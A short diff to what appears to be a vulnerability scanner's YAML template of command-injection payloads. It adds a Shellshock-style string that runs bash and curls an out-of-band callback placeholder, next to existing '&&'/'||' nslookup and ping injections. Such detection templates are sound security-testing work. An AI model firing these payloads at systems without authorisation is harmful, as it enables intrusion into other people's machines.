@@ -32,5 +32,6 @@ templates:
   - "&& nslookup {{.oob_address}}"
   - "|| ping -c 3 {{.oob_address}}"
   - "&& ping -c 3 {{.oob_address}}"
+  - '() { :;}; /bin/bash -c "curl http://{{.oob_address}}/"'
 categories:
   - command_injection
